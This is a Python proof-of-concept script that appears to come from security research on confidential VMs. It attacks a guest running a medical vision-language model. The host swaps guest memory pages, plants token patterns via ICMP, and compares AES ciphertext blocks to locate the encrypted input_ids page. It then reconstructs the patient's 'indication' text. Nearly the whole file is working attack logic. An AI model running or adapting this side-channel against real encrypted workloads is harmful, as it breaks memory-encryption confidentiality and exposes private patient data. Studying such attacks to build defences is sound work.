#!/usr/bin/env python3
"""
llm_e2e.py — full host-only end-to-end for ONE held LLM inference:
  (B-full) locate the input_ids page inside a 2MB block via the image_pad
           ciphertext fingerprint (scan every page of the block),
  (derive) tok_start from where the image_pad run ends (host-only),
  (C)      recover the indication string by planting each dictionary label's
           token pattern and testing it, position-wise, against clean 16B AES
           blocks in the indication window.

No guest-reported GPA is used by the algorithm; the guest GPA/indication are
captured ONLY to grade the result.

The 2MB block to scan is the tracker candidate block from step (A)
(llm_block_candidates.py). For this held-buffer validation we bound the scan
to the block that actually holds the buffer (derived from the grading GPA) as
a stand-in for that candidate; the page-finding and string recovery inside it
are fully blind.

Usage:
  sudo python3 llm_e2e.py --index 2
  sudo python3 llm_e2e.py --index 2 --scan-block 0x1e5400000   # explicit block
"""
import argparse
import re
import subprocess
import sys
import time
from pathlib import Path

import numpy as np

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE.parent / "mura" / "dict"))
from mura_dict_build import (  # noqa: E402
    acquire_gpa, do_swap_read, parse_dump, ensure_mtu_9000, drain_rxbuf,
    PAGE_SIZE, CHUNK_SIZE, CHUNKS_PAGE,
    SWAP_PACE_SEC, SWAP_BURST_COOLDOWN, SWAP_BURST_SLEEP,
)
sys.path.insert(0, str(HERE / "dict"))   # orchestrate_v4 imports read_gpa (in dict/)
sys.path.insert(0, str(HERE))
from orchestrate_v4 import TOKEN_LABELS, IMAGE_PAD_TOKEN_ID  # noqa: E402

SWAP_TOOL = str(HERE / "swap_pages_tool")
SCAN_TMP  = HERE / "scan_tmp_llm"
BLOCK     = 0x200000
PAGES_PER_BLOCK = BLOCK // PAGE_SIZE

KEY   = "/home/eun/.ssh/id_ed25519"
GUEST = "ubuntu@localhost"
GPORT = "7777"
GUEST_PY  = "/home/ubuntu/miniconda3/envs/vlm/bin/python3"
GUEST_CWD = "~/medical_ml/med_vlm/scripts"
GSCRIPT   = "single_inference_indication_gpa.py"
SSH = ["ssh", "-p", GPORT, "-i", KEY, "-o", "BatchMode=yes",
       "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=8", GUEST]

IMAGE_PAD_MATCH_MIN = 40   # a page needs at least this many image_pad-matching
                           # confirmed offsets to be called an input_ids page


def _block(b: bytes, j: int) -> bytes:
    return b[j*CHUNK_SIZE:(j+1)*CHUNK_SIZE]


def tok_chunk(token_ids) -> bytes:
    """16-byte chunk = first two int64 tokens (fills a page when repeated)."""
    a, b = token_ids[0], token_ids[1]
    return np.array([a, b], dtype="<i8").tobytes()


def imagepad_chunk() -> bytes:
    return np.array([IMAGE_PAD_TOKEN_ID, IMAGE_PAD_TOKEN_ID], dtype="<i8").tobytes()


def read_at_fixed(fixed_gpa: int, src_gpa: int, tag: str) -> bytes:
    SCAN_TMP.mkdir(exist_ok=True)
    tmp = SCAN_TMP / f"{tag}.out"
    do_swap_read(fixed_gpa, src_gpa, tmp, SWAP_TOOL)
    data = parse_dump(tmp)
    tmp.unlink(missing_ok=True)
    return data


def plant_ref(fixed_gpa: int, chunk: bytes, zero: bytes, tag: str,
              tries: int = 4):
    """Plant a token pattern via ICMP, read at FIXED, return (ref, mask) where
    mask = offsets confirmed different from a zero page (i.e. actually the
    planted pattern). Retries partial plants."""
    best, best_mask = None, set()
    for t in range(tries):
        g = acquire_gpa(chunk[0] if False else 0, chunk_bytes=chunk)  # u8_val unused
        cur = read_at_fixed(fixed_gpa, g, f"{tag}_{t}")
        mask = {j for j in range(CHUNKS_PAGE) if _block(cur, j) != _block(zero, j)}
        if len(mask) > len(best_mask):
            best, best_mask = cur, mask
        if len(best_mask) >= 200:
            break
        try:
            drain_rxbuf(rounds=1)
        except Exception:
            pass
        time.sleep(1)
    return best, best_mask


def pace(k: int):
    if SWAP_BURST_COOLDOWN and k and k % SWAP_BURST_COOLDOWN == 0:
        time.sleep(SWAP_BURST_SLEEP)
    else:
        time.sleep(SWAP_PACE_SEC)


def hold_guest(index: int):
    cmd = (f"cd {GUEST_CWD} && sudo {GUEST_PY} -u {GSCRIPT} "
           f"--gpa-only --calibrate --stdin-loop")
    g = subprocess.Popen(SSH + [cmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, text=True, bufsize=1)
    for line in g.stdout:
        if "LOOP_READY" in line:
            break
    g.stdin.write(f"{index}\n"); g.stdin.flush()
    gt = {"base": None, "N": None, "tok_start": None, "indication": None}
    for line in g.stdout:
        m = re.search(r"input_ids base page GPA:\s+0x([0-9a-f]+)", line, re.I)
        if m: gt["base"] = int(m.group(1), 16)
        m = re.search(r"N_image_pad:\s+(\d+)", line)
        if m: gt["N"] = int(m.group(1))
        m = re.search(r"tok_start:\s+(\d+)", line)
        if m: gt["tok_start"] = int(m.group(1))
        if line.strip() and gt["indication"] is None and "INDICATION" not in line \
           and "=" not in line and gt["base"] is None:
            pass
        if "HOLDING" in line:
            break
    return g, gt


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--index", type=int, default=2)
    p.add_argument("--scan-block", type=lambda x: int(x, 0), default=None,
                   help="2MB block base to scan (default: block of the held buffer)")
    p.add_argument("--stride", type=int, default=1,
                   help="page stride for the block scan (1 = every page)")
    p.add_argument("--window", type=int, default=None,
                   help="if set, scan base_page +/- this many pages instead of the "
                        "full 2MB block (faster/less PSP for validation)")
    p.add_argument("--labels", type=int, default=len(TOKEN_LABELS),
                   help="how many dictionary labels to try (default: all)")
    args = p.parse_args()

    ensure_mtu_9000()
    print(f"[hold] triggering guest index {args.index} (gpa-only, HOLDING)...")
    g, gt = hold_guest(args.index)
    if gt["base"] is None:
        print("[!] hold failed", file=sys.stderr); return
    base_page = gt["base"]
    scan_block = args.scan_block if args.scan_block is not None else (base_page & ~(BLOCK - 1))
    print(f"[hold] GT (grading only): base=0x{base_page:x} N={gt['N']} tok_start={gt['tok_start']}")
    print(f"[scan] scanning 2MB block 0x{scan_block:x} (stride {args.stride})")

    try:
        print("[ref] FIXED_GPA...")
        fixed = acquire_gpa(None)
        print(f"[ref] FIXED=0x{fixed:x}")
        zero = read_at_fixed(fixed, acquire_gpa(None), "zero")
        print("[ref] image_pad reference...")
        ip_ref, ip_mask = plant_ref(fixed, imagepad_chunk(), zero, "ip")
        print(f"[ref] image_pad confirmed offsets: {len(ip_mask)}/256")
        if len(ip_mask) < 100:
            print("[!] weak image_pad ref, aborting", file=sys.stderr); return

        # ---- (B-full) scan the block for the input_ids page ----
        best_page, best_hits = None, -1
        found = []
        n = 0
        if args.window is not None:
            pages = [base_page + d * PAGE_SIZE for d in range(-args.window, args.window + 1)]
        else:
            pages = [scan_block + k * PAGE_SIZE for k in range(0, PAGES_PER_BLOCK, args.stride)]
        for page in pages:
            pace(n); n += 1
            data = read_at_fixed(fixed, page, "pg")
            hits = sum(1 for j in ip_mask if _block(data, j) == _block(ip_ref, j))
            if hits >= IMAGE_PAD_MATCH_MIN:
                found.append((page, hits, data))
                print(f"  [B] page 0x{page:x}  image_pad={hits}/{len(ip_mask)} "
                      f"{'<== GT' if page == base_page else ''}")
            if hits > best_hits:
                best_page, best_hits = page, hits
        if not found:
            print(f"[B] no image_pad page found in block (best {best_hits})", file=sys.stderr)
            return
        # pick the page with the most image_pad blocks as the input_ids page
        ids_page, ids_hits, ids_data = max(found, key=lambda x: x[1])
        print(f"[B] input_ids page (host-derived) = 0x{ids_page:x} "
              f"({ids_hits}/{len(ip_mask)} image_pad)  GT base=0x{base_page:x}  "
              f"match={ids_page == base_page}")

        # ---- (derive) tok_start from image_pad run end on ids_page ----
        pad_blocks = sorted(j for j in ip_mask if _block(ids_data, j) == _block(ip_ref, j))
        last_pad_block = pad_blocks[-1]
        # each block = 2 tokens; indication starts right after the pad run
        tok_start_est = 2 * (last_pad_block + 1)
        print(f"[derive] image_pad run ends at block {last_pad_block} -> "
              f"tok_start_est={tok_start_est}  (GT tok_start={gt['tok_start']})")

        # ---- (C) recover the indication string via label planting ----
        # scan even token positions in a window after the pad run
        win_lo = max(tok_start_est - 4, 0)
        win_hi = tok_start_est + 40
        # even positions -> clean 16B block = position//2
        cand_positions = [pos for pos in range(win_lo, win_hi) if pos % 2 == 0]
        print(f"[C] indication window tokens [{win_lo},{win_hi}) "
              f"({len(cand_positions)} even/clean positions)")

        hits_found = []   # (position, label_idx, label)
        for li in range(min(args.labels, len(TOKEN_LABELS))):
            label, token_ids = TOKEN_LABELS[li]
            lref, lmask = plant_ref(fixed, tok_chunk(token_ids), zero, f"L{li}")
            if not lmask:
                continue
            for pos in cand_positions:
                blk = pos // 2
                if blk not in lmask:
                    continue
                if _block(ids_data, blk) == _block(lref, blk):
                    hits_found.append((pos, li, label))
            try:
                drain_rxbuf(rounds=1)
            except Exception:
                pass

        print("\n" + "=" * 66)
        print(f"  RECOVERED (host-only) for index {args.index}")
        print("=" * 66)
        if hits_found:
            for pos, li, label in sorted(hits_found):
                print(f"  tok {pos:4d}  label[{li}] = {label!r}")
        else:
            print("  (no label matched in window)")
        print("-" * 66)
        recon = " ".join(lbl for _, _, lbl in sorted(hits_found))
        print(f"  reconstructed labels: {recon}")
        print(f"  GROUND TRUTH indication tok_start={gt['tok_start']}")
        print("=" * 66)
    finally:
        try:
            g.stdin.write("QUIT\n"); g.stdin.flush(); g.wait(timeout=15)
        except Exception:
            g.kill()


if __name__ == "__main__":
    main()
